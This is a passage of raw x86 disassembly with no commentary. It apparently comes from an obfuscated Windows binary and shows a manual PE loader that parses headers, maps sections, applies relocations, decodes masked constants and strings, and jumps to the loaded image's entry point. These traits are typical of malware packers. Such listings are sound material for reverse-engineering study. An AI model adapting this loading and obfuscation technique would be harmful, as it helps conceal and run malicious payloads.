  4185ae:	mov    DWORD PTR [ebp+0xc],eax
  4185b1:	mov    eax,DWORD PTR [eax+0x50]
  4185b4:	test   eax,eax
  4185b6:	je     0x4189b7
  4185bc:	mov    DWORD PTR [ebp-0x2c],0xf88c8585
  4185c3:	mov    eax,DWORD PTR [ebp-0x2c]
  4185c6:	xor    eax,esi
  4185c8:	add    eax,edi
  4185ca:	mov    DWORD PTR [ebp-0x2c],eax
  4185cd:	mov    eax,DWORD PTR [ebp-0x4]
  4185d0:	mov    eax,DWORD PTR [ebx+0x190]
  4185d6:	mov    ecx,DWORD PTR [eax]
  4185d8:	mov    ecx,DWORD PTR [ecx+0x3c]
  4185db:	add    ecx,DWORD PTR [eax]
  4185dd:	mov    eax,DWORD PTR [ebp-0x4]
  4185e0:	mov    eax,DWORD PTR [ebx+0x18c]
  4185e6:	mov    edx,DWORD PTR [eax]
  4185e8:	mov    DWORD PTR [ebp-0x18],ecx
  4185eb:	mov    DWORD PTR [ebp+0x20],edx
  4185ee:	cmp    edx,edx
  4185f0:	jne    0x418624
  4185f2:	mov    eax,DWORD PTR [ebx+0x1d8]
  4185f8:	lea    edx,[ebp-0x1c]
  4185fb:	push   edx
  4185fc:	mov    edx,DWORD PTR [ebp-0xc]
  4185ff:	xor    edx,esi
  418601:	add    edx,edi
  418603:	push   edx
  418604:	push   DWORD PTR [ecx+0x50]
  418607:	push   DWORD PTR [ebp+0x20]
  41860a:	call   DWORD PTR [eax+0x1c]
  41860d:	mov    eax,DWORD PTR [ebp-0x18]
  418610:	mov    ecx,DWORD PTR [eax+0x54]
  418613:	mov    eax,DWORD PTR [eax+0x50]
  418616:	sub    eax,ecx
  418618:	add    ecx,DWORD PTR [ebp+0x20]
  41861b:	push   ecx
  41861c:	call   0x418fa3
  418621:	mov    edx,DWORD PTR [ebp+0x20]
  418624:	mov    eax,DWORD PTR [ebx+0x194]
  41862a:	mov    DWORD PTR [eax],edx
  41862c:	mov    eax,DWORD PTR [ebp+0xc]
  41862f:	push   DWORD PTR [eax+0x54]
  418632:	push   DWORD PTR [ebp+0x8]
  418635:	push   edx
  418636:	call   0x418e4a
  41863b:	mov    ecx,DWORD PTR [ebp+0x20]
  41863e:	mov    eax,DWORD PTR [ecx+0x3c]
  418641:	add    eax,ecx
  418643:	movzx  ecx,WORD PTR [eax+0x14]
  418647:	lea    ecx,[ecx+eax*1+0x18]
  41864b:	mov    DWORD PTR [ebp+0x18],ecx
  41864e:	mov    ecx,DWORD PTR [ebp-0x4]
  418651:	movzx  edx,WORD PTR [eax+0x6]
  418655:	xor    ecx,esi
  418657:	add    ecx,edi
  418659:	mov    DWORD PTR [ebp+0xc],eax
  41865c:	cmp    edx,ecx
  41865e:	je     0x41870b
  418664:	mov    ecx,DWORD PTR [ebp-0x4]
  418667:	xor    ecx,esi
  418669:	add    ecx,edi
  41866b:	mov    DWORD PTR [ebp-0x8],ecx
  41866e:	mov    ecx,DWORD PTR [ebp-0x24]
  418671:	movzx  edx,WORD PTR [eax+0x6]
  418675:	xor    ecx,esi
  418677:	sub    edx,ecx
  418679:	sub    edx,edi
  41867b:	cmp    DWORD PTR [ebp-0x8],edx
  41867e:	ja     0x41870b
  418684:	mov    edx,DWORD PTR [ebp+0x18]
  418687:	add    edx,0x8
  41868a:	mov    DWORD PTR [ebp+0x18],edx
  41868d:	jmp    0x418692
  41868f:	mov    edx,DWORD PTR [ebp+0x18]
  418692:	mov    eax,DWORD PTR [eax+0x38]
  418695:	lea    ecx,[eax-0x1]
  418698:	mov    DWORD PTR [ebp-0x34],eax
  41869b:	mov    eax,DWORD PTR [edx]
  41869d:	test   ecx,eax
  41869f:	je     0x4186a8
  4186a1:	not    ecx
  4186a3:	and    eax,ecx
  4186a5:	add    eax,DWORD PTR [ebp-0x34]
  4186a8:	mov    ecx,DWORD PTR [edx+0x4]
  4186ab:	add    ecx,DWORD PTR [ebp+0x20]
  4186ae:	push   ecx
  4186af:	call   0x418fa3
  4186b4:	mov    edx,DWORD PTR [ebp-0x4]
  4186b7:	mov    eax,DWORD PTR [ebp+0x18]
  4186ba:	mov    ecx,DWORD PTR [eax+0x8]
  4186bd:	xor    edx,esi
  4186bf:	add    edx,edi
  4186c1:	cmp    ecx,edx
  4186c3:	je     0x4186dc
  4186c5:	push   ecx
  4186c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4186c9:	add    ecx,DWORD PTR [eax+0xc]
  4186cc:	mov    eax,DWORD PTR [eax+0x4]
  4186cf:	add    eax,DWORD PTR [ebp+0x20]
  4186d2:	push   ecx
  4186d3:	push   eax
  4186d4:	call   0x418e4a
  4186d9:	mov    eax,DWORD PTR [ebp+0x18]
  4186dc:	mov    ecx,DWORD PTR [ebp-0x24]
  4186df:	mov    edx,DWORD PTR [ebp-0x8]
  4186e2:	add    eax,0x28
  4186e5:	xor    ecx,esi
  4186e7:	lea    ecx,[edx+ecx*1+0x3272e2]
  4186ee:	mov    edx,DWORD PTR [ebp+0xc]
  4186f1:	mov    DWORD PTR [ebp+0x18],eax
  4186f4:	mov    eax,DWORD PTR [ebp-0x24]
  4186f7:	movzx  edx,WORD PTR [edx+0x6]
  4186fb:	xor    eax,esi
  4186fd:	sub    edx,eax
  4186ff:	mov    eax,DWORD PTR [ebp+0xc]
  418702:	sub    edx,edi
  418704:	mov    DWORD PTR [ebp-0x8],ecx
  418707:	cmp    ecx,edx
  418709:	jbe    0x41868f
  41870b:	mov    edx,DWORD PTR [ebx+0x18c]
  418711:	mov    ecx,DWORD PTR [ebp+0x20]
  418714:	cmp    ecx,DWORD PTR [edx]
  418716:	jne    0x41873f
  418718:	mov    eax,DWORD PTR [ebx+0x1d8]
  41871e:	lea    edx,[ebp-0x1c]
  418721:	push   edx
  418722:	mov    edx,DWORD PTR [ebp-0x10]
  418725:	xor    edx,esi
  418727:	add    edx,edi
  418729:	push   edx
  41872a:	mov    edx,DWORD PTR [ebp-0x18]
  41872d:	push   DWORD PTR [edx+0x54]
  418730:	push   ecx
  418731:	call   DWORD PTR [eax+0x1c]
  418734:	test   eax,eax
  418736:	je     0x4189a8
  41873c:	mov    eax,DWORD PTR [ebp+0xc]
  41873f:	mov    ecx,DWORD PTR [ebx+0x1c8]
  418745:	mov    ecx,DWORD PTR [ecx]
  418747:	xor    ecx,esi
  418749:	add    ecx,edi
  41874b:	je     0x4188d3
  418751:	and    DWORD PTR [ebp-0x28],0x0
  418755:	and    DWORD PTR [ebp+0x8],0x0
  418759:	mov    eax,0xf89c8519
  41875e:	lea    ecx,[eax-0x8]
  418761:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  418768:	mov    DWORD PTR [ebp-0x48],0xf89c8509
  41876f:	mov    DWORD PTR [ebp-0x44],eax
  418772:	mov    DWORD PTR [ebp-0x40],ecx
  418775:	mov    DWORD PTR [ebp-0x3c],ecx
  418778:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41877f:	mov    edx,DWORD PTR [ebp+0x8]
  418782:	mov    ecx,0x89b
  418787:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41878c:	mov    edx,0x72e2
  418791:	add    cx,dx
  418794:	mov    edx,DWORD PTR [ebp+0x8]
  418797:	inc    DWORD PTR [ebp+0x8]
  41879a:	cmp    DWORD PTR [ebp+0x8],0x6
  41879e:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  4187a6:	jb     0x41877f
  4187a8:	mov    ecx,0xf89c850b
  4187ad:	mov    DWORD PTR [ebp-0xa4],eax
  4187b3:	mov    DWORD PTR [ebp-0x90],eax
  4187b9:	mov    DWORD PTR [ebp-0x68],eax
  4187bc:	mov    DWORD PTR [ebp-0x64],eax
  4187bf:	lea    eax,[ecx-0x1]
  4187c2:	mov    edx,0xf89c85ff
  4187c7:	mov    DWORD PTR [ebp-0x58],eax
  4187ca:	mov    DWORD PTR [ebp-0x54],eax
  4187cd:	mov    DWORD PTR [ebp-0xa8],0xf89c85f1
  4187d7:	mov    DWORD PTR [ebp-0xa0],ecx
  4187dd:	mov    DWORD PTR [ebp-0x9c],edx
  4187e3:	mov    DWORD PTR [ebp-0x98],0xf89c851c
  4187ed:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  4187f7:	mov    DWORD PTR [ebp-0x8c],0xf89c85f8
  418801:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41880b:	mov    DWORD PTR [ebp-0x84],0xf89c8509
  418815:	mov    DWORD PTR [ebp-0x80],ecx
  418818:	mov    DWORD PTR [ebp-0x7c],0xf89c850c
  41881f:	mov    DWORD PTR [ebp-0x78],edx
  418822:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  418829:	mov    DWORD PTR [ebp-0x70],ecx
  41882c:	mov    DWORD PTR [ebp-0x6c],0xf89c85c4
  418833:	mov    DWORD PTR [ebp-0x60],ecx
  418836:	mov    DWORD PTR [ebp-0x5c],0xf89c8518
  41883d:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  418844:	xor    eax,eax
  418846:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41884d:	xor    cl,0x9b
  418850:	sub    cl,0x1e
  418853:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41885a:	inc    eax
  41885b:	cmp    eax,0x17
  41885e:	jb     0x418846
  418860:	mov    eax,DWORD PTR [ebx+0x1d8]
  418866:	lea    ecx,[ebp-0xb4]
  41886c:	push   ecx
  41886d:	call   DWORD PTR [eax+0x4]
  418870:	mov    ecx,DWORD PTR [ebx+0x1d8]
  418876:	lea    edx,[ebp-0xcc]
  41887c:	push   edx
  41887d:	push   eax
  41887e:	call   DWORD PTR [ecx+0x8]
  418881:	lea    ecx,[ebp-0x28]
  418884:	push   ecx
  418885:	mov    ecx,DWORD PTR [ebx+0x18c]
  41888b:	push   DWORD PTR [ecx]
  41888d:	call   eax
  41888f:	mov    eax,DWORD PTR [ebp-0x28]
  418892:	test   eax,eax
  418894:	je     0x4188d0
  418896:	mov    DWORD PTR [ebp+0x8],eax
  418899:	jmp    0x4188a5
  41889b:	mov    eax,DWORD PTR [eax]
  41889d:	mov    DWORD PTR [ebp-0x28],eax
  4188a0:	cmp    eax,DWORD PTR [ebp+0x8]
  4188a3:	je     0x4188b2
  4188a5:	mov    edx,DWORD PTR [eax+0x18]
  4188a8:	mov    ecx,DWORD PTR [ebx+0x18c]
  4188ae:	cmp    edx,DWORD PTR [ecx]
  4188b0:	jne    0x41889b
  4188b2:	mov    edx,DWORD PTR [eax+0x18]
  4188b5:	mov    ecx,DWORD PTR [ebx+0x18c]
  4188bb:	cmp    edx,DWORD PTR [ecx]
  4188bd:	jne    0x4188d0
  4188bf:	mov    edx,DWORD PTR [ebp-0x18]
  4188c2:	mov    ecx,DWORD PTR [ebx+0x190]
  4188c8:	mov    edx,DWORD PTR [edx+0x28]
  4188cb:	add    edx,DWORD PTR [ecx]
  4188cd:	mov    DWORD PTR [eax+0x1c],edx
  4188d0:	mov    eax,DWORD PTR [ebp+0xc]
  4188d3:	push   ebx
  4188d4:	push   eax
  4188d5:	push   DWORD PTR [ebp+0x20]
  4188d8:	call   0x418082
  4188dd:	test   eax,eax
  4188df:	je     0x4189a8
  4188e5:	push   DWORD PTR [ebp+0xc]
  4188e8:	mov    ecx,ebx
  4188ea:	push   DWORD PTR [ebp+0x20]
  4188ed:	call   0x417fdb
  4188f2:	test   eax,eax
  4188f4:	je     0x4189a8
  4188fa:	mov    eax,DWORD PTR [ebp+0xc]
  4188fd:	mov    edx,DWORD PTR [ebp+0x20]
  418900:	mov    ecx,ebx
  418902:	call   0x417eb4
  418907:	test   eax,eax
  418909:	je     0x4189a8
  41890f:	push   ebx
  418910:	push   DWORD PTR [ebp+0x20]
  418913:	call   0x418365
  418918:	test   eax,eax
  41891a:	je     0x4189a8
  418920:	mov    eax,DWORD PTR [ebx+0x18c]
  418926:	mov    edx,DWORD PTR [ebp+0x20]
  418929:	cmp    edx,DWORD PTR [eax]
  41892b:	jne    0x418947
  41892d:	mov    eax,DWORD PTR [ebx+0x1d8]
  418933:	lea    ecx,[ebp-0x1c]
  418936:	push   ecx
  418937:	push   DWORD PTR [ebp-0x1c]
  41893a:	mov    ecx,DWORD PTR [ebp-0x18]
  41893d:	push   DWORD PTR [ecx+0x54]
  418940:	push   edx
  418941:	call   DWORD PTR [eax+0x1c]
  418944:	mov    edx,DWORD PTR [ebp+0x20]
  418947:	mov    eax,DWORD PTR [ebx+0x1c8]
  41894d:	mov    eax,DWORD PTR [eax]
  41894f:	xor    eax,esi
  418951:	add    eax,edi
  418953:	je     0x41898c
  418955:	mov    ecx,DWORD PTR [ebp+0xc]
  418958:	mov    eax,DWORD PTR [ecx+0x28]
  41895b:	mov    DWORD PTR [ebp+0x8],0xf89ca585
  418962:	mov    esi,DWORD PTR [ebp+0x8]
  418965:	push   DWORD PTR [ebp+0x14]
  418968:	xor    esi,0x89b
  41896e:	push   DWORD PTR [ebp+0x10]
  418971:	add    esi,0x72e2
  418977:	or     WORD PTR [ecx+0x16],si
  41897b:	add    eax,edx
  41897d:	push   edx
  41897e:	call   eax
  418980:	mov    DWORD PTR [ebx+0x1d0],0xf89c8584
  41898a:	jmp    0x418996
  41898c:	mov    eax,DWORD PTR [ebp+0xc]
  41898f:	mov    eax,DWORD PTR [eax+0x28]
  418992:	add    eax,edx
  418994:	call   eax
  418996:	mov    DWORD PTR [ebp-0x8],eax
  418999:	mov    eax,DWORD PTR [ebp-0x8]
  41899c:	mov    ecx,DWORD PTR [ebp+0x1c]
  41899f:	mov    DWORD PTR [ecx],eax
  4189a1:	mov    DWORD PTR [ebp-0x30],0x1
  4189a8:	cmp    DWORD PTR [ebp-0x30],0x0
  4189ac:	jne    0x4189b2
  4189ae:	and    DWORD PTR [ebp+0x20],0x0
  4189b2:	mov    eax,DWORD PTR [ebp+0x20]
  4189b5:	jmp    0x4189b9
  4189b7:	xor    eax,eax
  4189b9:	pop    edi
  4189ba:	pop    esi
  4189bb:	pop    ebx
  4189bc:	leave  
  4189bd:	ret    0x1c
  4189c0:	push   ebp
  4189c1:	mov    ebp,esp
  4189c3:	movzx  edx,WORD PTR [ecx+0x6]
  4189c7:	movzx  eax,WORD PTR [ecx+0x14]
  4189cb:	push   ebx
  4189cc:	push   edi
  4189cd:	xor    edi,edi
  4189cf:	lea    eax,[eax+ecx*1+0x18]
  4189d3:	test   edx,edx
  4189d5:	je     0x4189f6
  4189d7:	mov    ecx,DWORD PTR [eax+0xc]
  4189da:	lea    ebx,[ecx+esi*1]
  4189dd:	cmp    DWORD PTR [ebp+0x8],ebx
  4189e0:	jb     0x4189ee
  4189e2:	mov    ebx,DWORD PTR [eax+0x8]
  4189e5:	add    ebx,ecx
  4189e7:	add    ebx,esi
  4189e9:	cmp    DWORD PTR [ebp+0x8],ebx
  4189ec:	jb     0x4189f8
  4189ee:	add    eax,0x28
  4189f1:	inc    edi
  4189f2:	cmp    edi,edx
  4189f4:	jb     0x4189d7
  4189f6:	xor    eax,eax
  4189f8:	pop    edi
  4189f9:	pop    ebx
  4189fa:	pop    ebp
  4189fb:	ret    0x4
  4189fe:	push   ebp
  4189ff:	mov    ebp,esp
  418a01:	sub    esp,0x34
  418a04:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  418a0b:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  418a12:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  418a19:	mov    DWORD PTR [ebp-0x8],0xf89c85e4
  418a20:	mov    DWORD PTR [ebp-0x20],0xf89c85c4
  418a27:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  418a2e:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  418a35:	mov    DWORD PTR [ebp-0x10],eax
  418a38:	mov    eax,DWORD PTR [ebp+0x8]
  418a3b:	mov    DWORD PTR [ebp-0x14],eax
  418a3e:	mov    eax,DWORD PTR [ebp-0xc]
  418a41:	push   ebx
  418a42:	mov    ecx,0x751089b
  418a47:	xor    eax,ecx
  418a49:	push   esi
  418a4a:	mov    esi,DWORD PTR [ebp-0x10]
  418a4d:	mov    edx,0x3272e2
  418a52:	add    eax,edx
  418a54:	push   edi
  418a55:	cmp    esi,eax
  418a57:	je     0x418c36
  418a5d:	mov    eax,DWORD PTR [ebp-0xc]
  418a60:	mov    esi,DWORD PTR [ebp-0x14]
  418a63:	xor    eax,ecx
  418a65:	add    eax,edx
  418a67:	cmp    esi,eax
  418a69:	je     0x418c36
  418a6f:	mov    eax,DWORD PTR [ebp-0xc]
  418a72:	xor    eax,ecx
  418a74:	add    eax,edx
  418a76:	mov    DWORD PTR [ebp-0x24],eax
  418a79:	mov    eax,DWORD PTR [ebp-0xc]
  418a7c:	xor    eax,ecx
  418a7e:	add    eax,edx
  418a80:	mov    DWORD PTR [ebp-0x28],eax
  418a83:	mov    edi,DWORD PTR [ebp-0x20]
  418a86:	mov    ebx,DWORD PTR [ebp-0x8]
  418a89:	mov    esi,0x89b
  418a8e:	xor    edi,esi
  418a90:	mov    eax,0x72e2
  418a95:	xor    ebx,esi
  418a97:	add    edi,eax
  418a99:	add    ebx,eax
  418a9b:	sub    ebx,edi
  418a9d:	mov    WORD PTR [ebp-0x8],bx
  418aa1:	jmp    0x418b66
  418aa6:	mov    edi,DWORD PTR [ebp-0xc]
  418aa9:	mov    bx,WORD PTR [ebp-0x4]
  418aad:	xor    edi,esi
  418aaf:	add    edi,eax
  418ab1:	cmp    bx,di
  418ab4:	je     0x418ba8
  418aba:	mov    edi,DWORD PTR [ebp-0xc]
  418abd:	mov    ebx,DWORD PTR [ebp+0xc]
  418ac0:	xor    edi,ecx
  418ac2:	add    edi,edx
  418ac4:	cmp    ebx,edi
  418ac6:	mov    di,WORD PTR [ebp-0x4]
  418aca:	mov    bx,WORD PTR [ebp+0x8]
  418ace:	je     0x418b39
  418ad0:	cmp    bx,di
  418ad3:	je     0x418b42
  418ad5:	mov    edi,DWORD PTR [ebp-0x20]
  418ad8:	mov    bx,WORD PTR [ebp+0x8]
  418adc:	xor    edi,esi
  418ade:	add    edi,eax
  418ae0:	cmp    bx,di
  418ae3:	jb     0x418b03
  418ae5:	mov    edi,DWORD PTR [ebp-0x2c]
  418ae8:	mov    bx,WORD PTR [ebp+0x8]
  418aec:	xor    edi,esi
  418aee:	add    edi,eax
  418af0:	cmp    bx,di
  418af3:	ja     0x418b03
  418af5:	movzx  edi,WORD PTR [ebp+0x8]
  418af9:	movzx  ebx,WORD PTR [ebp-0x8]
  418afd:	add    edi,ebx
  418aff:	mov    WORD PTR [ebp+0x8],di
  418b03:	mov    edi,DWORD PTR [ebp-0x20]
  418b06:	mov    bx,WORD PTR [ebp-0x4]
  418b0a:	xor    edi,esi
  418b0c:	add    edi,eax
  418b0e:	cmp    bx,di
  418b11:	jb     0x418b31
  418b13:	mov    edi,DWORD PTR [ebp-0x2c]
  418b16:	mov    bx,WORD PTR [ebp-0x4]
  418b1a:	xor    edi,esi
  418b1c:	add    edi,eax
  418b1e:	cmp    bx,di
  418b21:	ja     0x418b31
  418b23:	movzx  edi,WORD PTR [ebp-0x4]
  418b27:	movzx  ebx,WORD PTR [ebp-0x8]
  418b2b:	add    edi,ebx
  418b2d:	mov    WORD PTR [ebp-0x4],di
  418b31:	mov    di,WORD PTR [ebp-0x4]
  418b35:	mov    bx,WORD PTR [ebp+0x8]
  418b39:	cmp    bx,di
  418b3c:	jne    0x418c36
  418b42:	mov    edi,DWORD PTR [ebp-0x1c]
  418b45:	mov    ebx,DWORD PTR [ebp-0x10]
  418b48:	xor    edi,ecx
  418b4a:	lea    edi,[edi+ebx*1+0x3272e2]
  418b51:	mov    DWORD PTR [ebp-0x10],edi
  418b54:	mov    edi,DWORD PTR [ebp-0x1c]
  418b57:	mov    ebx,DWORD PTR [ebp-0x14]
  418b5a:	xor    edi,ecx
  418b5c:	lea    edi,[edi+ebx*1+0x3272e2]
  418b63:	mov    DWORD PTR [ebp-0x14],edi
  418b66:	mov    edi,DWORD PTR [ebp-0x24]
  418b69:	mov    ebx,DWORD PTR [ebp-0x10]
  418b6c:	mov    di,WORD PTR [ebx+edi*2]
  418b70:	mov    WORD PTR [ebp+0x8],di
  418b74:	mov    edi,DWORD PTR [ebp-0x28]
  418b77:	mov    ebx,DWORD PTR [ebp-0x14]
  418b7a:	mov    di,WORD PTR [ebx+edi*2]
  418b7e:	mov    WORD PTR [ebp-0x4],di
  418b82:	mov    edi,DWORD PTR [ebp-0xc]
  418b85:	mov    bx,WORD PTR [ebp+0x8]
  418b89:	xor    edi,esi
  418b8b:	add    edi,eax
  418b8d:	cmp    bx,di
  418b90:	jne    0x418aa6
  418b96:	mov    eax,DWORD PTR [ebp-0x18]
  418b99:	mov    esi,DWORD PTR [ebp-0xc]
  418b9c:	xor    eax,ecx
  418b9e:	add    eax,edx
  418ba0:	imul   eax,esi
  418ba3:	mov    DWORD PTR [ebp-0xc],eax
  418ba6:	jmp    0x418bba
  418ba8:	mov    eax,DWORD PTR [ebp-0xc]
  418bab:	mov    esi,DWORD PTR [ebp-0x18]
  418bae:	xor    eax,ecx
  418bb0:	lea    eax,[eax+esi*1+0x3272e2]
  418bb7:	mov    DWORD PTR [ebp-0x18],eax
  418bba:	mov    eax,DWORD PTR [ebp-0x24]
  418bbd:	sub    eax,edx
  418bbf:	xor    eax,ecx
  418bc1:	mov    DWORD PTR [ebp-0x30],eax
  418bc4:	mov    eax,DWORD PTR [ebp-0x28]
  418bc7:	sub    eax,edx
  418bc9:	xor    eax,ecx
  418bcb:	mov    DWORD PTR [ebp-0x34],eax
  418bce:	mov    eax,DWORD PTR [ebp-0x34]
  418bd1:	mov    esi,DWORD PTR [ebp-0x1c]
  418bd4:	xor    esi,ecx
  418bd6:	add    esi,edx
  418bd8:	xor    eax,ecx
  418bda:	add    eax,0x3272e2
  418bdf:	imul   esi,eax
  418be2:	mov    eax,DWORD PTR [ebp-0x14]
  418be5:	movzx  eax,WORD PTR [esi+eax*1]
  418be9:	mov    esi,DWORD PTR [ebp-0x30]
  418bec:	mov    edi,DWORD PTR [ebp-0x1c]
  418bef:	xor    esi,ecx
  418bf1:	add    esi,edx
  418bf3:	xor    edi,ecx
  418bf5:	add    edi,edx
  418bf7:	imul   edi,esi
  418bfa:	mov    esi,DWORD PTR [ebp-0x10]
  418bfd:	movzx  esi,WORD PTR [edi+esi*1]
  418c01:	sub    eax,edx
  418c03:	sub    esi,edx
  418c05:	xor    eax,ecx
  418c07:	xor    esi,ecx
  418c09:	cmp    esi,eax
  418c0b:	jne    0x418c36
  418c0d:	mov    eax,DWORD PTR [ebp-0x30]
  418c10:	mov    esi,DWORD PTR [ebp-0x1c]
  418c13:	xor    eax,ecx
  418c15:	add    eax,0x3272e2
  418c1a:	xor    esi,ecx
  418c1c:	add    esi,edx
  418c1e:	imul   esi,eax
  418c21:	mov    eax,DWORD PTR [ebp-0x10]
  418c24:	movzx  eax,WORD PTR [esi+eax*1]
  418c28:	mov    esi,DWORD PTR [ebp-0xc]
  418c2b:	sub    eax,edx
  418c2d:	xor    eax,ecx
  418c2f:	cmp    eax,esi
  418c31:	mov    eax,DWORD PTR [ebp-0xc]
  418c34:	je     0x418c39
  418c36:	mov    eax,DWORD PTR [ebp-0x18]
  418c39:	pop    edi
  418c3a:	xor    eax,ecx
  418c3c:	pop    esi
  418c3d:	add    eax,edx
  418c3f:	pop    ebx
  418c40:	leave  
  418c41:	ret    0x8
  418c44:	push   ebp
  418c45:	mov    ebp,esp
  418c47:	push   ecx
  418c48:	mov    cx,WORD PTR [eax]
  418c4b:	push   esi
  418c4c:	mov    esi,0x3b51
  418c51:	sub    cx,si
  418c54:	mov    esi,0x8a8d
  418c59:	xor    cx,si
  418c5c:	mov    esi,0x4e22
  418c61:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  418c68:	mov    edx,0xf89c8585
  418c6d:	cmp    cx,si
  418c70:	je     0x418ccf
  418c72:	push   ebx
  418c73:	push   edi
  418c74:	movzx  ecx,cx
  418c77:	mov    edi,0xffcd8d1e
  418c7c:	mov    esi,0x751089b
  418c81:	mov    ebx,0x4f86
  418c86:	cmp    cx,bx
  418c89:	jne    0x418c8e
  418c8b:	mov    DWORD PTR [ebp-0x4],edx
  418c8e:	lea    edx,[edi+0x1]
  418c91:	xor    edx,esi
  418c93:	mov    edi,edx
  418c95:	xor    edi,esi
  418c97:	mov    cx,WORD PTR [eax+edi*2+0x64e5c4]
  418c9f:	mov    ebx,0x3b51
  418ca4:	sub    cx,bx
  418ca7:	mov    ebx,0x8a8d
  418cac:	xor    cx,bx
  418caf:	mov    ebx,0x4e22
  418cb4:	cmp    cx,bx
  418cb7:	jne    0x418c81
  418cb9:	mov    ecx,DWORD PTR [ebp-0x4]
  418cbc:	pop    edi
  418cbd:	pop    ebx
  418cbe:	cmp    ecx,0xf89c8586
  418cc4:	je     0x418ccf
  418cc6:	xor    ecx,esi
  418cc8:	lea    eax,[eax+ecx*2+0x64e5c6]
  418ccf:	pop    esi
  418cd0:	leave  
  418cd1:	ret    
  418cd2:	push   ebp
  418cd3:	mov    ebp,esp
  418cd5:	push   ecx
  418cd6:	push   esi
  418cd7:	push   edi
  418cd8:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  418cdf:	mov    esi,0xf89c8585
  418ce4:	call   0x418c44
  418ce9:	mov    edi,eax
  418ceb:	mov    al,BYTE PTR [edi]
  418ced:	add    al,0x8
  418cef:	xor    al,0x74
  418cf1:	cmp    al,0x7c
  418cf3:	je     0x418d56
  418cf5:	mov    eax,edi
  418cf7:	mov    edx,0xffcd8d1e
  418cfc:	mov    ecx,0x751089b
  418d01:	push   ebx
  418d02:	mov    ax,WORD PTR [eax]
  418d05:	mov    ebx,0x3b51
  418d0a:	sub    ax,bx
  418d0d:	mov    ebx,0x8a8d
  418d12:	xor    ax,bx
  418d15:	mov    ebx,0x4e50
  418d1a:	cmp    ax,bx
  418d1d:	jne    0x418d22
  418d1f:	mov    DWORD PTR [ebp-0x4],esi
  418d22:	lea    esi,[edx+0x1]
  418d25:	xor    esi,ecx
  418d27:	mov    edx,esi
  418d29:	xor    edx,ecx
  418d2b:	lea    eax,[edi+edx*2+0x64e5c4]
  418d32:	mov    bl,BYTE PTR [eax]
  418d34:	add    bl,0x8
  418d37:	xor    bl,0x74
  418d3a:	cmp    bl,0x7c
  418d3d:	jne    0x418d02
  418d3f:	mov    eax,DWORD PTR [ebp-0x4]
  418d42:	pop    ebx
  418d43:	cmp    eax,0xf89c8586
  418d48:	je     0x418d56
  418d4a:	xor    eax,ecx
  418d4c:	xor    ecx,ecx
  418d4e:	mov    WORD PTR [edi+eax*2+0x64e5c4],cx
  418d56:	mov    eax,edi
  418d58:	pop    edi
  418d59:	pop    esi
  418d5a:	leave  
  418d5b:	ret    
  418d5c:	push   ebp
  418d5d:	mov    ebp,esp
  418d5f:	push   ecx
  418d60:	push   esi
  418d61:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  418d68:	mov    esi,0xf89c8585
  418d6d:	call   0x418c44
  418d72:	mov    cx,WORD PTR [eax]
  418d75:	mov    edx,0x3b51
  418d7a:	sub    cx,dx
  418d7d:	mov    edx,0x8a8d
  418d82:	xor    cx,dx
  418d85:	mov    edx,0x4e22
  418d8a:	cmp    cx,dx
  418d8d:	je     0x418de6
  418d8f:	push   ebx
  418d90:	push   edi
  418d91:	movzx  ecx,cx
  418d94:	mov    edx,0xffcd8d1e
  418d99:	mov    edi,0x751089b
  418d9e:	mov    ebx,0x4e50
  418da3:	cmp    cx,bx
  418da6:	jne    0x418dab
  418da8:	mov    DWORD PTR [ebp-0x4],esi
  418dab:	lea    esi,[edx+0x1]
  418dae:	xor    esi,edi
  418db0:	mov    edx,esi
  418db2:	xor    edx,edi
  418db4:	mov    cx,WORD PTR [eax+edx*2+0x64e5c4]
  418dbc:	mov    ebx,0x3b51
  418dc1:	sub    cx,bx
  418dc4:	mov    ebx,0x8a8d
  418dc9:	xor    cx,bx
  418dcc:	mov    ebx,0x4e22
  418dd1:	cmp    cx,bx
  418dd4:	jne    0x418d9e
  418dd6:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  418ddd:	pop    edi
  418dde:	pop    ebx
  418ddf:	je     0x418de6
  418de1:	xor    eax,eax
  418de3:	inc    eax
  418de4:	jmp    0x418de8
  418de6:	xor    eax,eax
  418de8:	pop    esi
  418de9:	leave  
  418dea:	ret    
  418deb:	push   ebp
  418dec:	mov    ebp,esp
  418dee:	push   ecx
  418def:	mov    eax,DWORD PTR [ebp+0x8]
  418df2:	movzx  ecx,WORD PTR [eax]
  418df5:	push   esi
  418df6:	lea    eax,[ecx-0x3b51]
  418dfc:	mov    esi,0x8a8d
  418e01:	push   edi
  418e02:	xor    eax,esi
  418e04:	mov    edi,0x4e22
  418e09:	mov    DWORD PTR [ebp-0x4],edx
  418e0c:	cmp    ax,di
  418e0f:	je     0x418e3c
  418e11:	mov    eax,DWORD PTR [ebp+0x8]
  418e14:	sub    eax,edx
  418e16:	mov    DWORD PTR [ebp+0x8],eax
  418e19:	jmp    0x418e1e
  418e1b:	mov    eax,DWORD PTR [ebp+0x8]
  418e1e:	mov    WORD PTR [edx],cx
  418e21:	add    edx,0x2
  418e24:	movzx  edi,WORD PTR [eax+edx*1]
  418e28:	mov    ecx,edi
  418e2a:	add    edi,0xffffc4af
  418e30:	xor    edi,esi
  418e32:	mov    eax,0x4e22
  418e37:	cmp    di,ax
  418e3a:	jne    0x418e1b
  418e3c:	xor    eax,eax
  418e3e:	pop    edi
  418e3f:	mov    WORD PTR [edx],ax
  418e42:	mov    eax,DWORD PTR [ebp-0x4]
  418e45:	pop    esi
  418e46:	leave  
  418e47:	ret    0x4
  418e4a:	push   ebp
